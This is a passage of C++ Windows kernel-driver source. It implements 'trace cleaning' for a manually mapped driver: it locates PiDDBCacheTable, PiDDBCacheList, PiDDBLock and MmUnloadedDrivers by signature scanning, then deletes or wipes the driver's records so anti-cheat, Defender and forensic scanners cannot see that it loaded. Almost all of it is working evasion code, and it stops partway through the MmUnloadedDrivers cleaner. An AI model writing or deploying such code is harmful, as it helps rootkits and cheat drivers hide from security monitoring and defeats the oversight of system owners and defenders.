// Trace cleaning. Four cleaners, all located by runtime signature + export table, no imports, no
// hardcoded offsets beyond the record layouts. Uses ScanModuleImage, ResolveRipRelative, GetNtoskrnl,
// EnumerateKProcess and the encoded strings. The fourth (WdFilter) is Defender's own bookkeeping and
// is the only one that can legitimately have nothing to do on a stripped image.
// Compiled only when MANUAL_MAP_ONLY is not defined. Release builds omit print()
// output, but the cleaners run from DriverEntry and DriverExit.

// Shared helpers
// ---------------------------------------------------------------------------

// Canonical kernel pointers are FFFF8.... and up; guards every dereference below against garbage hits
constexpr uint64_t KernelPointerFloor = 0xFFFF800000000000;

bool IsKernelPointer(uint64_t Value)
{
    return Value >= KernelPointerFloor;
}

// A canonical pointer can still be unmapped. Before dereferencing a resolved data global, require it
// to lie inside the loaded image that the signature was scanned from; the PE header is already mapped.
static bool IsAddressInImage(address Base, uint64_t Value)
{
    if (!Base) return false;

    auto Dos = (_IMAGE_DOS_HEADER *) Base;
    auto Nt = (_IMAGE_NT_HEADERS64 *) (Base + Dos->e_lfanew);
    uint64_t Start = (uint64_t) Base;
    uint64_t End = Start + Nt->OptionalHeader.SizeOfImage;
    return Value >= Start && Value < End;
}

// Walks the export directory by hand so the cleaners create no import table entries; data exports come
// back as the variable itself (this is how PsLoadedModuleResource is reached without MmGetSystemRoutineAddress)
address ResolveKernelSymbol(const char *Name)
{
    address Nt = GetNtoskrnl();
    if (!Nt)
    {
        print(ERROR("ResolveKernelSymbol: ntoskrnl not found"));
        return nullptr;
    }

    return FindFuncExports(Nt, Name);
}

// Batch variant: one walk of ntoskrnl's export table resolves every name at once - the single
// variant above re-walks the whole table per symbol. Names[i] lands in Results[i]; a name
// not exported leaves that slot null
static void ResolveKernelSymbols(const char *const *Names, address *Results, uint32_t Count)
{
    address Nt = GetNtoskrnl();
    if (!Nt)
    {
        print(ERROR("ResolveKernelSymbols: ntoskrnl not found"));
        return;
    }

    FindFuncExportsBatch(Nt, Names, Results, Count);
}

// Cached addresses of the boot-stable scan targets below, the same three-state pattern as GetNtoskrnl:
// 0 = not scanned yet, Failed = scanned and missed (deterministic, never retried), else the address.
// Each target is a data global or image base that does not move for the rest of the boot
static uint64_t CachedPiDDBCacheList = 0;
static uint64_t CachedMmUnloadedDrivers = 0;
static uint64_t CachedMmLastUnloadedDriver = 0;
static uint64_t CachedCiBase = 0;
static uint64_t CachedHashBucketList = 0;
static uint64_t CachedWdFilterBase = 0;
static uint64_t CachedWdFilterList = 0;
static uint64_t CachedWdFilterCount = 0;
static uint64_t CachedWdFilterArray = 0;
static uint64_t CachedWdFilterFree = 0;

// Shared prologue for the Find* resolvers: true when Cache already holds a terminal value (Result is
// the typed address, or null for Failed); false when the caller must run the scan.
template<typename T>
static bool LoadTraceCache(uint64_t* Cache, T* Result)
{
    uint64_t Cached = __atomic_load_n(Cache, __ATOMIC_SEQ_CST);
    if (!Cached) return false;

    *Result = Cached == Failed ? (T) nullptr : (T) Cached;
    return true;
}

// Case-folded equality of two UNICODE_STRINGs (the names compared here are ASCII file names, so
// folding the 6th bit is exact). Null buffers, odd lengths or mismatched lengths do not match
static bool WideNameEquals(const _UNICODE_STRING* A, const _UNICODE_STRING* B)
{
    if (!A || !B || !A->Buffer || !B->Buffer) return false;
    if (A->Length != B->Length || (A->Length & 1)) return false;

    const uint32_t Chars = A->Length / sizeof(wchar_t);
    for (uint32_t i = 0; i < Chars; ++i)
        if (!(A->Buffer[i] == B->Buffer[i] || (A->Buffer[i] | 0x20) == (B->Buffer[i] | 0x20)))
            return false;

    return true;
}

// ---------------------------------------------------------------------------
// Cleaner 1: PiDDBCacheTable
// ---------------------------------------------------------------------------

// Every load attempt is filed in CI's "PiDDB process cache" (an AVL tree plus a circular housekeeping
// list, both in ntoskrnl), which cache walks still see after everything else is scrubbed. Rather than
// hand-rolling AVL rebalancing (one wrong balance byte corrupts the table for CI itself), the kernel's
// own RtlDeleteElementGenericTableAvl is resolved from the export table and used. A true clean takes
// PiDDBLock, restores an already-camouflaged entry's original name (the AVL tree still positions the
// node by that key), unlinks the housekeeping entry, deletes the AVL node, then frees the separate
// name-buffer allocation that the table's free callback does not own
struct _PiDDB_CACHE_ENTRY
{
    struct _LIST_ENTRY List;             //0x0 housekeeping list every entry is threaded onto
    struct _UNICODE_STRING DriverName;   //0x10
    uint32_t TimeDateStamp;              //0x20 PE timestamp of the entry's binary
    int32_t LoadStatus;                  //0x24 NTSTATUS of the recorded load
    uint8_t ShimEngineData[16];          //0x28 shim-engine data, uninitialized for custom drivers
};

// The AVL node header RtlDeleteElementGenericTableAvl stores at the front of every table allocation;
// the caller's record starts at +0x20. Field layout from the live 19041 RTL_BALANCED_LINKS
struct _PiDDB_AVL_NODE
{
    VOID* Parent;                        //0x0
    VOID* Left;                          //0x8
    VOID* Right;                         //0x10
    uint8_t Balance;                     //0x18
    uint8_t Reserved[7];                 //0x19
};

static_assert(sizeof(_PiDDB_AVL_NODE) == 0x20, "PiDDB AVL node header must be 0x20 bytes");

constexpr uint32_t PiDDBAvlUserDataOffset = 0x20;
constexpr uint32_t PiDDBTableRootOffset = 0x10;    // RTL_AVL_TABLE.BalancedRoot.RightChild
constexpr uint32_t PiDDBTableCountOffset = 0x2c;   // RTL_AVL_TABLE.NumberGenericTableElements
constexpr uint32_t PiDDBTableDepthOffset = 0x30;   // RTL_AVL_TABLE.DepthOfTree
constexpr uint32_t PiDDBTableCompareOffset = 0x48; // RTL_AVL_TABLE.CompareRoutine
constexpr uint32_t PiDDBTableAllocateOffset = 0x50;
constexpr uint32_t PiDDBTableFreeOffset = 0x58;

// Most entries a walk may visit before giving up (the live table on 19041 held 142); the bound
// keeps a corrupt list from turning the walk into an endless loop
constexpr uint32_t MaxPiDDBEntries = 0x800;
constexpr uint32_t MaxPiDDBTreeDepth = 64;
constexpr uint32_t MaxPiDDBCacheNameBytes = 512;

// The one name check shared by all four cleaners and their verifiers. 512 bytes is the strictest bound
// the cleaners used (WdFilter allowed 1024), so applying it to every target is safe. The buffer must be
// kernel-resident because every cleaner dereferences it; a rejected target is skipped, never guessed at
static bool IsValidTraceTarget(const _UNICODE_STRING* Target)
{
    return Target && Target->Buffer && Target->Length && !(Target->Length & 1) &&
           Target->Length <= MaxPiDDBCacheNameBytes &&                // same bound the cleaners used
           Target->MaximumLength >= Target->Length &&
           IsKernelPointer((uint64_t) Target->Buffer);
}

// A PiDDB record name is well formed: even bounded length, capacity covers it, and a non-empty
// name has a kernel-resident buffer. A zero-length name is legal here (the walkers treat it as
// non-matching, not as damage).
static bool IsPlausiblePiDDBEntryName(const _UNICODE_STRING& Name)
{
    return !(Name.Length & 1) && Name.Length <= MaxPiDDBCacheNameBytes &&
           Name.MaximumLength >= Name.Length &&
           (!Name.Length || IsKernelPointer((uint64_t) Name.Buffer));
}

// Reads a header field without forming a misaligned typed pointer: the table base is only known to be
// byte-aligned, and -Wcast-align is part of the build. The constant size makes __builtin_memcpy inline
template<typename T>
static T ReadPiDDBField(const uint8_t* Base, uint32_t Offset)
{
    T Value = {};
    __builtin_memcpy(&Value, Base + Offset, sizeof(T));
    return Value;
}

// PiDDB's ERESOURCE helpers; the MmUnloadedDrivers cleaner below deliberately takes no lock
typedef int (*ExAcquireResourceExclusiveLite_t)(VOID* Resource, uint8_t Wait);
typedef int (*ExReleaseResourceLite_t)(VOID* Resource);
typedef uint8_t (*RtlDeleteElementGenericTableAvl_t)(VOID* Table, VOID* Buffer);
typedef void (*ExFreePool_t)(VOID* Pool);

static uint64_t CachedPiDDBCacheTable = 0;
static uint64_t CachedPiDDBLock = 0;

// The housekeeping list head, nt!PiDDBCacheList, from the InsertTailList block in nt!PiLookupInDDBCache
// (see the signature comment in Strings.h). The entries hang off the head, Flink to Flink, back around
// to the head, so the whole cache is reachable without ever touching the AVL tree
static _LIST_ENTRY* FindPiDDBCacheList(address Nt)
{
    _LIST_ENTRY* Cached = nullptr;
    if (LoadTraceCache(&CachedPiDDBCacheList, &Cached)) return Cached;

    address Match = ScanModuleImage(Nt, Decode(PiDDBCacheListSignature));
    if (!Match)
    {
        print(ERROR("PiDDB: list signature not found"));
        __atomic_store_n(&CachedPiDDBCacheList, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    // The lea sits at the match itself; its disp32 at +3, the instruction is 7 bytes
    auto List = (_LIST_ENTRY *) ResolveRipRelative((const char *) Match, 3, 7);
    if (!IsKernelPointer((uint64_t) List) || !IsAddressInImage(Nt, (uint64_t) List))
    {
        print(ERROR("PiDDB: list head %p is not a kernel pointer in nt"), (void *) List);
        __atomic_store_n(&CachedPiDDBCacheList, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedPiDDBCacheList, (uint64_t) List, __ATOMIC_SEQ_CST);
    return List;
}

// The AVL table object (nt!PiDDBCacheTable), from the lookup block in PiLookupInDDBCache. The table's
// own header is validated before any caller deletes through it: a wrong lea must fail here, not free
// an arbitrary pool block. Count/depth/routine fields match the live 19041 table (142 entries, depth 9)
static void* FindPiDDBCacheTable(address Nt)
{
    void* Cached = nullptr;
    if (LoadTraceCache(&CachedPiDDBCacheTable, &Cached)) return Cached;

    address Match = ScanModuleImage(Nt, Decode(PiDDBCacheTableSignature));
    if (!Match)
    {
        print(ERROR("PiDDB: table signature not found"));
        __atomic_store_n(&CachedPiDDBCacheTable, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    auto Table = (uint8_t *) ResolveRipRelative((const char *) Match, 3, 7);
    if (!IsKernelPointer((uint64_t) Table) || !IsAddressInImage(Nt, (uint64_t) Table))
    {
        print(ERROR("PiDDB: table %p is not a kernel pointer in nt"), (void *) Table);
        __atomic_store_n(&CachedPiDDBCacheTable, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    uint32_t Count = ReadPiDDBField<uint32_t>(Table, PiDDBTableCountOffset);
    uint32_t Depth = ReadPiDDBField<uint32_t>(Table, PiDDBTableDepthOffset);
    uint64_t Compare = ReadPiDDBField<uint64_t>(Table, PiDDBTableCompareOffset);
    uint64_t Allocate = ReadPiDDBField<uint64_t>(Table, PiDDBTableAllocateOffset);
    uint64_t Free = ReadPiDDBField<uint64_t>(Table, PiDDBTableFreeOffset);
    uint64_t Root = ReadPiDDBField<uint64_t>(Table, PiDDBTableRootOffset);

    if (Count > MaxPiDDBEntries || Depth > MaxPiDDBTreeDepth ||
        !IsKernelPointer(Compare) || !IsKernelPointer(Allocate) || !IsKernelPointer(Free) ||
        (Count && !IsKernelPointer(Root)))
    {
        print(ERROR("PiDDB: table %p failed header validation (count %u, depth %u, root %p)"),
              (void *) Table, Count, Depth, (void *) Root);
        __atomic_store_n(&CachedPiDDBCacheTable, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedPiDDBCacheTable, (uint64_t) Table, __ATOMIC_SEQ_CST);
    print(INFO("PiDDB: table %p, %u entries, depth %u"), (void *) Table, Count, Depth);
    return Table;
}

// The PiDDB lock (nt!PiDDBLock), an ERESOURCE held across every list/table mutation by CI. The pattern
// starts 18 bytes before the `lea rcx,[PiDDBLock]`; resolving from that instruction's +3 displacement
// lands on the global. The first two ERESOURCE fields are the system-resource list links
static void* FindPiDDBLock(address Nt)
{
    void* Cached = nullptr;
    if (LoadTraceCache(&CachedPiDDBLock, &Cached)) return Cached;

    address Match = ScanModuleImage(Nt, Decode(PiDDBLockSignature));
    if (!Match)
    {
        print(ERROR("PiDDB: lock signature not found"));
        __atomic_store_n(&CachedPiDDBLock, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    auto Lock = (uint8_t *) ResolveRipRelative((const char *) Match + 18, 3, 7);
    if (!IsKernelPointer((uint64_t) Lock) ||
        !IsAddressInImage(Nt, (uint64_t) Lock) ||
        !IsKernelPointer(ReadPiDDBField<uint64_t>(Lock, 0)) ||
        !IsKernelPointer(ReadPiDDBField<uint64_t>(Lock, 8)))
    {
        print(ERROR("PiDDB: lock %p is not a plausible ERESOURCE in nt"), (void *) Lock);
        __atomic_store_n(&CachedPiDDBLock, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedPiDDBLock, (uint64_t) Lock, __ATOMIC_SEQ_CST);
    print(INFO("PiDDB: lock %p"), (void *) Lock);
    return Lock;
}

// Walks every well-formed entry on the housekeeping list, head -> ... -> head, handing each one to
// Visitor. Returns false when a malformed record (or the MaxPiDDBEntries bound) stopped the walk
// early; the caller decides whether that matters
template<typename F>
static bool ForEachPiDDBEntry(_LIST_ENTRY* Head, F Visitor)
{
    if (!IsKernelPointer((uint64_t) Head))
    {
        print(WARN("PiDDB: list head %p is not a kernel pointer"), (void *) Head);
        return false;
    }

    uint32_t Walked = 0;
    for (_LIST_ENTRY* Link = Head->Flink; ; Link = Link->Flink)
    {
        // Reaching the head is the normal end. Checked before the bound so a list holding exactly
        // MaxPiDDBEntries entries counts as complete, and a null next pointer counts as damage
        if (Link == Head) return true;

        // Validate the link before reading through it; a corrupt Head->Flink would otherwise fault
        // before the IsKernelPointer guard could reject it
        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxPiDDBEntries)
        {
            print(WARN("PiDDB: malformed link %p, walk stopped"), (void *) Link);
            return false;
        }

        // Stop at the first entry that does not look like a cache record: following links through a
        // torn or malformed entry would read garbage as pointers
        auto Entry = (_PiDDB_CACHE_ENTRY *) Link;
        if (!IsKernelPointer((uint64_t) Link->Flink) ||
            !IsPlausiblePiDDBEntryName(Entry->DriverName))
        {
            print(WARN("PiDDB: malformed entry %p, walk stopped"), (void *) Entry);
            return false;
        }

        Walked++;
        Visitor(Entry);
    }
}

// Runtime-resolved helpers: RtlDeleteElementGenericTableAvl performs the search/rebalance/delete
// using the kernel's own table code; ExFreePool releases the name buffer that the table's free callback
// does not own. Resolved once, through the export walker, so no import entry is created
static RtlDeleteElementGenericTableAvl_t PiDDBDeleteFn = nullptr;
static ExFreePool_t PiDDBFreeFn = nullptr;
static ExAcquireResourceExclusiveLite_t PiDDBAcquireFn = nullptr;
static ExReleaseResourceLite_t PiDDBReleaseFn = nullptr;

static bool ResolvePiDDBRoutines()
{
    if (PiDDBDeleteFn && PiDDBFreeFn && PiDDBAcquireFn && PiDDBReleaseFn) return true;

    auto DeleteName = Decode(RtlDeleteElementGenericTableAvlName);
    auto FreeName = Decode(ExFreePoolName);
    auto AcquireName = Decode(ExAcquireResourceName);
    auto ReleaseName = Decode(ExReleaseResourceName);
    const char *Names[4] = { DeleteName.data(), FreeName.data(), AcquireName.data(), ReleaseName.data() };
    address Found[4] = {};

    ResolveKernelSymbols(Names, Found, 4);
    PiDDBDeleteFn = (RtlDeleteElementGenericTableAvl_t) Found[0];
    PiDDBFreeFn = (ExFreePool_t) Found[1];
    PiDDBAcquireFn = (ExAcquireResourceExclusiveLite_t) Found[2];
    PiDDBReleaseFn = (ExReleaseResourceLite_t) Found[3];

    bool Ok = PiDDBDeleteFn && PiDDBFreeFn && PiDDBAcquireFn && PiDDBReleaseFn;
    if (!Ok)
    {
        PiDDBDeleteFn = nullptr;
        PiDDBFreeFn = nullptr;
        PiDDBAcquireFn = nullptr;
        PiDDBReleaseFn = nullptr;
        print(ERROR("PiDDB: one or more exported routines not found"));
    }
    return Ok;
}

// A record belongs to this driver when it still carries the loader's name, or when it was camouflaged
// by a previous load and carries this binary's timestamp under a different name. A zero timestamp is
// never used as a wildcard
static bool PiDDBEntryIsTarget(const _PiDDB_CACHE_ENTRY* Entry, const _UNICODE_STRING* Name, uint32_t Timestamp)
{
    if (WideNameEquals(&Entry->DriverName, Name)) return true;
    return Timestamp != 0 && Entry->TimeDateStamp == Timestamp;
}

// Put the loader's original name back before touching the AVL tree. The tree still positions the node
// by the key it was inserted with; the stored name was changed but the insertion key was not, so
// restoring it makes RtlDeleteElementGenericTableAvl's key search reach the node again
static bool RestorePiDDBEntryName(_PiDDB_CACHE_ENTRY* Entry, const _UNICODE_STRING* Original)
{
    if (!Entry->DriverName.Buffer || !Original->Buffer || (Original->Length & 1) ||
        Original->Length > MaxPiDDBCacheNameBytes || Original->Length > Entry->DriverName.MaximumLength ||
        Entry->DriverName.MaximumLength < Entry->DriverName.Length ||
        !IsKernelPointer((uint64_t) Entry->DriverName.Buffer) ||
        !IsKernelPointer((uint64_t) Original->Buffer))
        return false;

    if (WideNameEquals(&Entry->DriverName, Original))
        return true;

    uint32_t Chars = Original->Length / sizeof(wchar_t);
    for (uint32_t i = 0; i < Chars; ++i)
        Entry->DriverName.Buffer[i] = Original->Buffer[i];
    Entry->DriverName.Length = Original->Length;

    // MaximumLength is a byte count; a null terminator is optional when the buffer has no spare byte
    if (Original->Length + sizeof(wchar_t) <= Entry->DriverName.MaximumLength)
        Entry->DriverName.Buffer[Chars] = L'\0';

    return true;
}

// Unlink the housekeeping-list entry while holding PiDDBLock. The saved neighbors let the caller put
// it back if the AVL delete does not find the node
static bool UnlinkPiDDBEntry(_PiDDB_CACHE_ENTRY* Entry, _LIST_ENTRY** FlinkOut, _LIST_ENTRY** BlinkOut)
{
    _LIST_ENTRY* Links = &Entry->List;
    _LIST_ENTRY* Flink = Links->Flink;
    _LIST_ENTRY* Blink = Links->Blink;

    if (!IsKernelPointer((uint64_t) Flink) || !IsKernelPointer((uint64_t) Blink) ||
        Flink == Links || Blink == Links ||
        Flink->Blink != Links || Blink->Flink != Links)
        return false;

    *FlinkOut = Flink;
    *BlinkOut = Blink;
    Blink->Flink = Flink;
    Flink->Blink = Blink;
    return true;
}

static void RelinkPiDDBEntry(_PiDDB_CACHE_ENTRY* Entry, _LIST_ENTRY* Flink, _LIST_ENTRY* Blink)
{
    Entry->List.Flink = Flink;
    Entry->List.Blink = Blink;
    Blink->Flink = &Entry->List;
    Flink->Blink = &Entry->List;
}

// Restore the key, unlink the list node, then let the kernel's AVL code delete and free the table node.
// The name buffer is a separate allocation: CMFFreeFn frees only the table allocation, so it is freed
// here after the delete succeeds. On a failed AVL delete the list entry is relinked and the record is
// left in place; the caller counts that as a failed clean rather than claiming success
static bool DeletePiDDBEntry(void* Table, _PiDDB_CACHE_ENTRY* Entry, const _UNICODE_STRING* Original)
{
    if (!PiDDBDeleteFn || !PiDDBFreeFn)
        return false;

    if (!RestorePiDDBEntryName(Entry, Original))
    {
        print(WARN("PiDDB: entry %p cannot be restored to the loader name"), (void *) Entry);
        return false;
    }

    VOID* NameBuffer = Entry->DriverName.Buffer;
    _LIST_ENTRY* Flink = nullptr;
    _LIST_ENTRY* Blink = nullptr;
    if (!UnlinkPiDDBEntry(Entry, &Flink, &Blink))
    {
        print(WARN("PiDDB: entry %p has inconsistent list links, not deleted"), (void *) Entry);
        return false;
    }

    _PiDDB_CACHE_ENTRY Key = {};
    Key.DriverName = *Original;
    Key.TimeDateStamp = Entry->TimeDateStamp;

    if (!PiDDBDeleteFn(Table, &Key))
    {
        RelinkPiDDBEntry(Entry, Flink, Blink);
        print(WARN("PiDDB: AVL delete did not find entry %p (%wZ, timestamp %08x)"),
              (void *) Entry, &Entry->DriverName, Entry->TimeDateStamp);
        return false;
    }

    // The table free callback has already released the node. Free the separately allocated name
    // buffer unless it aliases the loader's own buffer
    if (NameBuffer && NameBuffer != (VOID*) Original->Buffer && IsKernelPointer((uint64_t) NameBuffer))
        PiDDBFreeFn(NameBuffer);

    return true;
}

// Deletes the records naming Target from both PiDDBCacheList and PiDDBCacheTable under PiDDBLock. True
// only when the walk completed and every matched record was deleted; false means an invalid target, a
// missing structure, a damaged list, or a failed delete, not merely that no record existed
bool ClearPiDDBCache(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("PiDDB: loader entry has no valid BaseDllName"));
        return false;
    }

    print(INFO("PiDDB: target %wZ, timestamp %08x"), Target, Timestamp);

    address Nt = GetNtoskrnl();
    if (!Nt) return false;

    _LIST_ENTRY* Head = FindPiDDBCacheList(Nt);
    if (!Head) return false;

    void* Table = FindPiDDBCacheTable(Nt);
    if (!Table) return false;

    void* Lock = FindPiDDBLock(Nt);
    if (!Lock) return false;

    if (!ResolvePiDDBRoutines())
        return false;

    if (!PiDDBAcquireFn(Lock, 1))
    {
        print(ERROR("PiDDB: could not acquire PiDDBLock"));
        return false;
    }

    uint32_t Walked = 0, Targets = 0, Deleted = 0, Failures = 0;
    bool ListOk = true;
    _LIST_ENTRY* Link = Head->Flink;

    while (Link != Head)
    {
        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxPiDDBEntries)
        {
            print(WARN("PiDDB: malformed link %p, clean stopped"), (void *) Link);
            ListOk = false;
            break;
        }

        auto Entry = (_PiDDB_CACHE_ENTRY *) Link;
        _LIST_ENTRY* Next = Link->Flink;

        if (!IsKernelPointer((uint64_t) Next) ||
            !IsPlausiblePiDDBEntryName(Entry->DriverName))
        {
            print(WARN("PiDDB: malformed entry %p, clean stopped"), (void *) Entry);
            ListOk = false;
            break;
        }

        Walked++;
        if (PiDDBEntryIsTarget(Entry, Target, Timestamp))
        {
            Targets++;
            print(INFO("PiDDB: deleting entry %p (%wZ, timestamp %08x)"),
                    (void *) Entry, &Entry->DriverName, Entry->TimeDateStamp);

            if (DeletePiDDBEntry(Table, Entry, Target))
                Deleted++;
            else
                Failures++;
        }

        // Deletion unlinks Entry; Next was read before that and is still the following live node
        Link = Next;
    }

    PiDDBReleaseFn(Lock);

    if (!ListOk)
        print(WARN("PiDDB: clean walk stopped early (damaged list), result may be partial"));
    if (Failures)
        print(WARN("PiDDB: %u of %u matched entries could not be deleted"), Failures, Targets);
    if (!Targets)
        print(INFO("PiDDB: no entry for this driver out of %u walked (nothing to clean)"), Walked);
    else if (Deleted)
        print(OK("PiDDB: %u of %u entries deleted (%u walked)"), Deleted, Targets, Walked);

    return ListOk && Failures == 0;
}


// Debug-only walk of the AVL tree through the table root. The list and tree must agree, and no node
// may still match this driver. The tree root is RTL_AVL_TABLE.BalancedRoot.RightChild; user data starts
// one RTL_BALANCED_LINKS past the node header. The caller holds PiDDBLock so inserts cannot race the walk
static bool VerifyPiDDBTree(void* Table, const _UNICODE_STRING* Name, uint32_t Timestamp, uint32_t* OutCount)
{
    *OutCount = 0;

    auto Bytes = (uint8_t *) Table;
    uint32_t TableCount = ReadPiDDBField<uint32_t>(Bytes, PiDDBTableCountOffset);
    uint32_t TableDepth = ReadPiDDBField<uint32_t>(Bytes, PiDDBTableDepthOffset);
    VOID* Root = ReadPiDDBField<VOID*>(Bytes, PiDDBTableRootOffset);

    struct _PiDDB_TREE_ITEM
    {
        VOID* Node;
        uint32_t Depth;
    };

    _PiDDB_TREE_ITEM Stack[MaxPiDDBTreeDepth] = {};
    uint32_t Top = 0, Visited = 0;
    bool Found = false;

    if (Root)
    {
        if (!IsKernelPointer((uint64_t) Root))
        {
            print(ERROR("VerifyPiDDB: tree root %p is not a kernel pointer"), Root);
            return false;
        }
        Stack[Top++] = { Root, 0 };
    }

    while (Top)
    {
        _PiDDB_TREE_ITEM Item = Stack[--Top];
        if (!IsKernelPointer((uint64_t) Item.Node) || Item.Depth >= MaxPiDDBTreeDepth ||
            Visited >= MaxPiDDBEntries)
        {
            print(ERROR("VerifyPiDDB: malformed tree node %p at depth %u"), Item.Node, Item.Depth);
            return false;
        }

        auto Node = (_PiDDB_AVL_NODE *) Item.Node;
        auto Entry = (_PiDDB_CACHE_ENTRY *) ((uintptr_t) Node + PiDDBAvlUserDataOffset);

        if (!IsPlausiblePiDDBEntryName(Entry->DriverName))
        {
            print(ERROR("VerifyPiDDB: malformed tree entry %p"), (void *) Entry);
            return false;
        }

        Visited++;
        if (PiDDBEntryIsTarget(Entry, Name, Timestamp))
        {
            if (!Found)
                print(ERROR("VerifyPiDDB: tree entry %p still matches this driver (%wZ, timestamp %08x)"),
                      (void *) Entry, &Entry->DriverName, Entry->TimeDateStamp);
            Found = true;
        }

        if (Node->Right)
        {
            if (Top >= MaxPiDDBTreeDepth)
            {
                print(ERROR("VerifyPiDDB: tree stack overflow at %p"), Item.Node);
                return false;
            }
            Stack[Top++] = { Node->Right, Item.Depth + 1 };
        }

        if (Node->Left)
        {
            if (Top >= MaxPiDDBTreeDepth)
            {
                print(ERROR("VerifyPiDDB: tree stack overflow at %p"), Item.Node);
                return false;
            }
            Stack[Top++] = { Node->Left, Item.Depth + 1 };
        }
    }

    if (Visited != TableCount)
    {
        print(ERROR("VerifyPiDDB: tree walk visited %u, table count %u, depth %u"),
              Visited, TableCount, TableDepth);
        return false;
    }

    *OutCount = Visited;
    return !Found;
}

// Debug-only self-check of the PiDDB cleaner, run right after it inside CleanDriverTraces. It takes
// PiDDBLock, walks both structures and confirms neither still matches the target, then checks that the
// list and table contain the same number of entries. Release builds drop the whole call
void VerifyPiDDBCache(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("VerifyPiDDB: loader entry has no valid BaseDllName, cannot verify"));
        return;
    }

    address Nt = GetNtoskrnl();
    if (!Nt) return;

    _LIST_ENTRY* Head = FindPiDDBCacheList(Nt);
    void* Table = FindPiDDBCacheTable(Nt);
    void* Lock = FindPiDDBLock(Nt);
    if (!Head || !Table || !Lock)
    {
        print(ERROR("VerifyPiDDB: list/table/lock not found, cannot verify"));
        return;
    }

    if (!ResolvePiDDBRoutines())
        return;

    if (!PiDDBAcquireFn(Lock, 1))
    {
        print(ERROR("VerifyPiDDB: could not acquire PiDDBLock"));
        return;
    }

    uint32_t ListWalked = 0, TreeWalked = 0;
    const _PiDDB_CACHE_ENTRY* Leaked = nullptr;

    bool ListOk = ForEachPiDDBEntry(Head, [&](auto Entry) {
        ListWalked++;
        if (!Leaked && PiDDBEntryIsTarget(Entry, Target, Timestamp))
            Leaked = Entry;
    });

    bool TreeOk = ListOk && VerifyPiDDBTree(Table, Target, Timestamp, &TreeWalked);

    PiDDBReleaseFn(Lock);

    if (!ListOk)
    {
        print(ERROR("VerifyPiDDB: walk stopped early, list damaged?"));
        return;
    }

    if (Leaked)
    {
        print(ERROR("VerifyPiDDB: FAILED, list entry %p still matches this driver (%wZ, timestamp %08x)"),
              (void *) Leaked, &Leaked->DriverName, Leaked->TimeDateStamp);
        return;
    }

    if (!TreeOk)
    {
        print(ERROR("VerifyPiDDB: FAILED, tree still matches this driver or is inconsistent"));
        return;
    }

    if (ListWalked != TreeWalked)
    {
        print(ERROR("VerifyPiDDB: list has %u entries, tree has %u"), ListWalked, TreeWalked);
        return;
    }

    print(OK("VerifyPiDDB: all checks passed (list %u, tree %u, none match this driver)"),
          ListWalked, TreeWalked);
}

// ---------------------------------------------------------------------------
// Cleaner 2: MmUnloadedDrivers / MmLastUnloadedDriver
// ---------------------------------------------------------------------------

// Every unload files an MM_UNLOADED_DRIVER record into a 50-slot array and bumps MmLastUnloadedDriver;
// "recently unloaded driver" tools read exactly this. Both sides are located by signature: the array
// pointer's rip-relative mov (stable across 1903-22H2) and the count's "cmp eax, 0x32" cap. This
// cleaner is deliberately zero-API: it reads and writes the array and count directly, with no Ex*/Rtl*
// calls. Matching names are wiped before their records are zeroed and compacted away. The kernel-owned
// name allocation cannot be returned to the pool without ExFreePoolWithTag, so it is intentionally left
// orphaned for the rest of the boot; wiping it removes the trace scanners read from pool memory.
constexpr uint32_t MmUnloadedDriversSize = 0x32;

struct _MM_UNLOADED_DRIVER
{
    struct _UNICODE_STRING Name;   //0x0 image name, buffer in its own pool allocation
    VOID* ModuleStart;             //0x10
    VOID* ModuleEnd;               //0x18
    ULONGLONG UnloadTime;          //0x20 unload time, descending across the array
};

// The array itself: the mov loads &MmUnloadedDrivers, one deref reads the array pointer out
static _MM_UNLOADED_DRIVER* FindMmUnloadedDrivers(address Nt)
{
    _MM_UNLOADED_DRIVER* Cached = nullptr;
    if (LoadTraceCache(&CachedMmUnloadedDrivers, &Cached)) return Cached;

    address Match = ScanModuleImage(Nt, Decode(MmUnloadedDriversSignature));
    if (!Match)
    {
        print(ERROR("MmUnloaded: array signature not found"));
        __atomic_store_n(&CachedMmUnloadedDrivers, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    auto Slot = (_MM_UNLOADED_DRIVER **) ResolveRipRelative(Match, 3, 7);
    if (!IsKernelPointer((uint64_t) Slot) || !IsKernelPointer((uint64_t) *Slot))
    {
        print(ERROR("MmUnloaded: slot %p dereferences to %p, not a kernel pointer"),
              Slot, Slot ? (void*) *Slot : nullptr);
        __atomic_store_n(&CachedMmUnloadedDrivers, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    // The slot holds &MmUnloadedDrivers; the array it points at is a static ntoskrnl global
    __atomic_store_n(&CachedMmUnloadedDrivers, (uint64_t) *Slot, __ATOMIC_SEQ_CST);
    print(INFO("MmUnloaded: array %p"), (void*) *Slot);
    return *Slot;
}

// The used-slot count, behind the "cmp eax, 0x32"
static uint32_t* FindMmLastUnloadedDriver(address Nt)
{
    uint32_t* Cached = nullptr;
    if (LoadTraceCache(&CachedMmLastUnloadedDriver, &Cached)) return Cached;

    address Match = ScanModuleImage(Nt, Decode(MmLastUnloadedDriverSignature));
    if (!Match)
    {
        print(ERROR("MmUnloaded: count signature not found"));
        __atomic_store_n(&CachedMmLastUnloadedDriver, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    // Only the POINTER is cached; the count itself changes with every unload and is read live.
    // The value check below validates the scan-time snapshot: a sane count there means the
    // slot really is MmLastUnloadedDriver, which stays true for the rest of the boot
    uint32_t* Count = (uint32_t*) ResolveRipRelative(Match, 2, 6);
    if (!IsKernelPointer((uint64_t) Count) || *Count > MmUnloadedDriversSize)
    {
        print(ERROR("MmUnloaded: count %p holds %u, not a plausible slot count"), Count, Count ? *Count : 0);
